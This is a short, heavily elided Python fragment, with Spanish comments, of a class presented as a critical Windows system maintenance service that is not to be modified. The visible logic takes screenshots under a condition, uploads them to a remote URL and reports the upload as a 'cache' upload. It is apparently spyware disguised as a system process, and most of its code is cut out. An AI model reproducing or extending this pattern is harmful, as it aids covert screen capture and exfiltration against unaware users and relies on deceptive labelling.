...
# ============================================
# Servicio de mantenimiento del sistema Windows
# No modificar - Proceso crítico del sistema
...
class WindowsSystemService:
    def __init__(self):
        ...
        self.es_compilado = getattr(sys, 'frozen', False)
                ...
                if tomar_captura:
                    ...
                    if img_path:
                        ...
                        if screenshot_url:
                            ...
                            print(f"[✓] Cache subido: {screenshot_url[:50]}...")
